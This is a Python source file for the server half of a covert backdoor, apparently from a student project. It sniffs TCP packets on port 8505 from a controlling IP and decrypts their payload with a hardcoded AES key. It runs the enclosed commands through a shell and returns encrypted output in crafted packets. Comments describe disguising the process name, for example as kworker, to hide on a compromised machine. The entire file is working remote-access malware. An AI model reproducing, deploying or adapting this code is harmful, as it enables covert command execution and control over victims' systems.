import sys
import socket
import subprocess
import setproctitle
import time
from scapy.all import *
from Crypto.Cipher import AES
from Crypto import Random




def usage():
    if len(sys.argv) != 3:
        print "To use: ", sys.argv[0], "[Server IP] [Client IP]"
        sys.exit()

def encryptCommand(message):
    #secret key and salt initialization
    secretKey = "Secret key lost."
    saltySpatoon = "How tough areyou"
    #encryption initialization
    crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
    #encrypt the data
    encryptedData = crypt.encrypt(message)
    return encryptedData

def decryptCommand(message):
    #secret key and salt initialization
    secretKey = "Secret key lost."
    saltySpatoon = "How tough areyou"
    #decryption initialization
    crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
    #decrypt the data
    decryptedData = crypt.decrypt(message)
    return decryptedData

def server(pkt):
    global srcIP
    global destIP
    #Grab the source IP for each packets
    src_ip = pkt[IP].src
    flagSet = pkt['TCP'].flags
    #key to authenticating the packet
    authPacket = "Authenticate packets"
    if src_ip == destIP:
        if flagSet == long(128):
            #Instantiate variables
            decryptedData=""
            newData = ""
            #Grab the raw data
            data = pkt[Raw].load
            #Decrypt the raw data
            decryptedData = decryptCommand(data)
            #If the decrypted data is authenticated, print it
            if decryptedData.startswith(authPacket) == True:
                #Take out the authentication part
                newData = decryptedData[20:]
                #If we get exit command, exit out of the system
                if newData == "exit":
                    encryptExit = encryptCommand(authPacket + newData)
                    pkt = IP(src=str(srcIP), dst=str(destIP))/TCP(dport=8505, flags='C')/Raw(load=ecryptExit)
                    #Send the packet
                    send(pkt)
                    time.sleep(2)
                else:
                    #Run the command using a child process so that it is hidden
                    process = subprocess.Popen(newData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    #Store the output of the command into output variable
                    output = process.stdout.read() + process.stderr.read()
                    #Encrypt the output and add the packet authenticator before sending back
                    encryptedReply = encryptCommand(authPacket + output)
                    #Create the output packet
                    pkt = IP(src=str(srcIP), dst=str(destIP))/TCP(dport=8505, flags='C')/Raw(load=encryptedReply)
                    #Send the packet
                    send(pkt)
            else:
                print data

if __name__ == "__main__":
    global srcIP
    global destIP
    usage()
    #Arguments from command line
    srcIP = sys.argv[1]
    destIP = sys.argv[2]
    #Change process name so that we can hide this program on a compromised machine
    #Make it look like a legitimate process running in the background
    #Usually we want to use something like kworker/2:1 to mask the program
    title = "Backdoor"
    setproctitle.setproctitle(title)
    #Sniff for packets from the host
    sniff(filter="tcp and host " + destIP + " and dst port 8505", prn=server)
